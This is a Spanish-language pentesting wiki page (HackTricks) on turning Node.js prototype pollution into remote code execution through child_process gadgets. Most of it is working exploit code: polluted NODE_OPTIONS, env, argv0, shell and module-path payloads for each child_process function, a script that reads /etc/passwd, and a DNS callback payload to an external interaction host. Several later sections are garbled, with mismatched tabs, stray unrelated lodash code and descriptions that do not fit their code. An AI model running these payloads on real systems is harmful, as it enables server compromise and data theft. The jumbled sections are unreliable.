# Prototype Pollution para RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## C√≥digo Vulnerable

Imagina un c√≥digo JS real que utiliza algo como lo siguiente:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
    console.log(typeof obj);
    return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

function clone(target) {
    return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE a trav√©s de variables de entorno

**PP2RCE** significa **Prototype Pollution to RCE** (Ejecuci√≥n Remota de C√≥digo).

Seg√∫n este [**informe**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), cuando se crea un **proceso** con alg√∫n m√©todo de **`child_process`** (como `fork` o `spawn` u otros), se llama al m√©todo `normalizeSpawnArguments`, que es un **gadget de prototype pollution para crear nuevas variables de entorno**:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
  ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
  const value = env[key];
  if (value !== undefined) {
    ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
  }
}
```
Revisa ese c√≥digo, puedes ver que es posible envenenar `envPairs` simplemente **contaminando** el atributo `.env`.

### Contaminando `__proto__`

{% hint style="warning" %}
Ten en cuenta que debido a c√≥mo funciona la funci√≥n **`normalizeSpawnArguments`** de la biblioteca **`child_process`** de node, cuando se llama a algo para **establecer una nueva variable de entorno** para el proceso, solo necesitas **contaminar cualquier cosa**. Por ejemplo, si haces `__proto__.avar="valuevar"`, el proceso se iniciar√° con una variable llamada `avar` con valor `valuevar`.

Sin embargo, para que la **variable de entorno sea la primera**, debes **contaminar** el atributo **`.env`** y (solo en algunos m√©todos) esa variable ser√° la **primera** (permitiendo el ataque).

Es por eso que **`NODE_OPTIONS`** no est√° dentro de `.env` en el siguiente ataque.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### Envenenando `constructor.prototype`
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE a trav√©s de variables de entorno + l√≠nea de comandos

Se propuso un payload similar al anterior con algunos cambios en [**este art√≠culo**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** Las principales diferencias son:

* En lugar de almacenar el **payload** de nodejs dentro del archivo `/proc/self/environ`, lo almacena dentro de argv0 de **`/proc/self/cmdline`**.
* Luego, en lugar de requerir a trav√©s de **`NODE_OPTIONS`** el archivo `/proc/self/environ`, se **requiere `/proc/self/cmdline`**.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## Interacci√≥n con DNS

Usando los siguientes payloads es posible abusar de la variable de entorno NODE\_OPTIONS que hemos discutido anteriormente y detectar si funcion√≥ con una interacci√≥n con DNS:
```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id.oastify.com"
  }
}
```
O bien, para evitar que los WAF soliciten el dominio:
```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
  }
}
```
## Vulnerabilidad PP2RCE en funciones de child\_process

En esta secci√≥n vamos a analizar **cada funci√≥n de `child_process`** para ejecutar c√≥digo y ver si podemos utilizar alguna t√©cnica para forzar a esa funci√≥n a ejecutar c√≥digo:

<details>

<summary>Explotaci√≥n de <code>exec</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
</details>

<details>

<summary><strong>Explotaci√≥n de <code>execFile</code></strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
Para que **`execFile`** funcione, **DEBE ejecutar node** para que NODE\_OPTIONS funcione.\
Si no est√° ejecutando **node**, debe encontrar c√≥mo podr√≠a **alterar la ejecuci√≥n** de lo que se est√° ejecutando **con variables de entorno** y configurarlas.

Las **otras** t√©cnicas **funcionan** sin este requisito porque es **posible modificar** **lo que se ejecuta** a trav√©s de la contaminaci√≥n del prototipo. (En este caso, incluso si puede contaminar `.shell`, no contaminar√° lo que se est√° ejecutando).

</details>

<details>

<summary>Explotaci√≥n de <code>fork</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong>Explotaci√≥n de <code>spawn</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong>Explotaci√≥n de <code>execFileSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Explotaci√≥n de <code>execSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Explotaci√≥n de <code>spawnSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## Forzando Spawn

En los ejemplos anteriores viste c√≥mo activar el gadget que necesita una funcionalidad que **llama a `spawn`** y que debe estar **presente** (todos los m√©todos de **`child_process`** utilizados para ejecutar algo lo llaman). En el ejemplo anterior, esto era **parte del c√≥digo**, pero ¬øqu√© pasa si el c√≥digo **no lo llama**?

### Controlando la ruta de un archivo require

En este [**otro art√≠culo**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) el usuario puede controlar la ruta del archivo donde se ejecutar√° un **`require`**. En ese escenario, el atacante solo necesita **encontrar un archivo `.js` dentro del sistema** que **ejecute un m√©todo spawn cuando se importe**.\
Algunos ejemplos de archivos comunes que llaman a una funci√≥n spawn cuando se importan son:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* Encuentra **m√°s archivos a continuaci√≥n**

El siguiente script simple buscar√° **llamadas** desde **child\_process** **sin ning√∫n relleno** (para evitar mostrar llamadas dentro de funciones): 

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
    grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>Archivos interesantes encontrados por el script anterior</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### Estableciendo la ruta del archivo require mediante la contaminaci√≥n del prototipo

{% hint style="warning" %}
La **t√©cnica anterior requiere** que el **usuario controle la ruta del archivo** que va a ser **requerido**. Pero esto no siempre es cierto.
{% endhint %}

Sin embargo, si el c√≥digo va a ejecutar un require despu√©s de la contaminaci√≥n del prototipo, incluso si **no controlas la ruta** que se va a requerir, **puedes forzar una diferente abusando de la contaminaci√≥n del prototipo**. Por lo tanto, incluso si la l√≠nea de c√≥digo es como `require("./a_file.js")` o `require("bytes")`, se **requerir√° el paquete que has contaminado**.

Por lo tanto, si se ejecuta un require despu√©s de la contaminaci√≥n del prototipo y no hay una funci√≥n spawn, este es el ataque:

* Encuentra un **archivo `.js` dentro del sistema** que cuando se **requiere** va a **ejecutar algo usando `child_process`**
  * Si puedes subir archivos a la plataforma que est√°s atacando, puedes subir un archivo as√≠
* Contamina las rutas para **forzar la carga del archivo `.js`** que ejecutar√° algo con child\_process
* **Contamina el environ/cmdline** para ejecutar c√≥digo arbitrario cuando se llama a una funci√≥n de ejecuci√≥n de child\_process (ver las t√©cnicas iniciales)

#### Require absoluto

Si el require realizado es **absoluto** (`require("bytes")`) y el **paquete no contiene main** en el archivo `package.json`, puedes **contaminar el atributo `main`** y hacer que el **require ejecute un archivo diferente**.

{% tabs %}
{% tab title="explotaci√≥n" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

En este ejemplo, el atacante aprovecha la vulnerabilidad de la contaminaci√≥n del prototipo para ejecutar el comando `cat /etc/passwd` en el sistema de la v√≠ctima. Este comando imprime el archivo `/etc/passwd`, que contiene informaci√≥n sobre los usuarios del sistema. El atacante puede usar esta informaci√≥n para intentar obtener acceso no autorizado al sistema.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% tab title="explotaci√≥n" %}
Si se carga una **ruta relativa** en lugar de una ruta absoluta, se puede hacer que node **cargue una ruta diferente**:

{% tabs %}
{% tab title="explotaci√≥n" %}
{% code overflow="wrap" %}const { exec } = require('child_process');
const { promisify } = require('util');
const { join } = require('path');
const writeFile = promisify(require('fs').writeFile);

const payload = `
const { exec } = require('child_process');
exec('id > /tmp/hacked');
`;

(async function() {
  const filename = join(process.cwd(), 'node_modules', 'lodash', 'package.json');
  const content = await writeFile(filename, payload);
  console.log(`File written: ${filename}`);
})();
{% endcode %}
{% endtab %}
{% endtabs %}

#### Relative require - 2

If a **relative path** is loaded instead of an absolute path, you can make node **load a different module**:

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

El siguiente c√≥digo es un ejemplo de c√≥mo se puede utilizar la t√©cnica de "prototype pollution" para lograr una ejecuci√≥n remota de c√≥digo (RCE) en una aplicaci√≥n Node.js vulnerable. En este ejemplo, el atacante aprovecha una vulnerabilidad de "prototype pollution" en la biblioteca `lodash` para agregar una propiedad maliciosa al objeto `Object.prototype`. Luego, el atacante crea un objeto `user` con la propiedad `isAdmin` establecida en `true`, lo que le permite obtener acceso a una funci√≥n que normalmente solo est√° disponible para los usuarios con privilegios de administrador. Finalmente, el atacante utiliza esta funci√≥n para ejecutar un comando malicioso en el sistema de la v√≠ctima.

Para protegerse contra este tipo de ataques, es importante mantener todas las bibliotecas y dependencias actualizadas y parchear cualquier vulnerabilidad conocida de "prototype pollution". Adem√°s, se recomienda validar y sanitizar cuidadosamente cualquier entrada de usuario para evitar la inyecci√≥n de c√≥digo malicioso en la aplicaci√≥n.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Relative require - 2

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// poc.js
const vm = require('vm');
const { readFileSync } = require('fs');
const { join } = require('path');

const payload = `
const { exec } = require('child_process');
exec('touch /tmp/hacked');
`;

const sandbox = {
  require: (module) => {
    if (module === 'lodash') {
      const lodash = require('lodash');
      lodash.mixin({ 'templateSettings': { 'evaluate': /<%([\s\S]+?)%>/g } });
      return lodash;
    }
    return require(module);
  }
};

const filename = join(process.cwd(), 'node_modules/lodash/lodash.js');
const lodash = readFileSync(filename, 'utf-8');
vm.runInNewContext(lodash, sandbox, { filename });

const template = '<%= console.log(process.mainModule.require("child_process").execSync("id").toString()) %>';
const compiled = sandbox._.template(template);
compiled();
```
{% endcode %}
{% endtab %}

{% tab title="description" %}
Este exploit aprovecha la vulnerabilidad de la contaminaci√≥n del prototipo para ejecutar c√≥digo arbitrario en el servidor. En este caso, se utiliza la biblioteca `lodash` para contaminar su prototipo y permitir la ejecuci√≥n de c√≥digo en el contexto del servidor. Luego, se utiliza una plantilla maliciosa para ejecutar el comando `id` y mostrar la identidad del usuario que ejecuta el servidor.
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

Este c√≥digo malicioso aprovecha la vulnerabilidad de la "polluci√≥n del prototipo" para ejecutar comandos en el sistema de la v√≠ctima. En este caso, el comando "cat /etc/passwd" se ejecuta en el sistema de la v√≠ctima y el resultado se muestra en la consola.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
## Gadgets de VM

En el art√≠culo [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) tambi√©n se indica que el control de **`contextExtensions`** de algunos m√©todos de la biblioteca **`vm`** podr√≠a ser utilizado como gadget.\
Sin embargo, al igual que los m√©todos anteriores de **`child_process`**, ha sido **corregido** en las √∫ltimas versiones.

## Correcciones y protecciones inesperadas

Tenga en cuenta que la contaminaci√≥n del prototipo funciona si el **atributo** de un objeto al que se est√° accediendo es **indefinido**. Si en el **c√≥digo** ese **atributo** se **establece** un **valor**, no se podr√° sobrescribir.

En junio de 2022, a partir de [**este commit**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a), la variable `options` en lugar de ser `{}` es un **`kEmptyObject`**. Lo que **evita que la contaminaci√≥n del prototipo** afecte a los **atributos** de **`options`** para obtener RCE.\
Al menos desde la versi√≥n 18.4.0, esta protecci√≥n ha sido **implementada**, y por lo tanto los **exploits** de `spawn` y `spawnSync` que afectan a los m√©todos ya **no funcionan** (¬°si no se usan opciones!).

En [**este commit**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) la **contaminaci√≥n del prototipo** de **`contextExtensions`** de la biblioteca vm tambi√©n fue **corregida** estableciendo opciones en \*\*`kEmptyObject` \*\* en lugar de **`{}`.**

## Referencias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

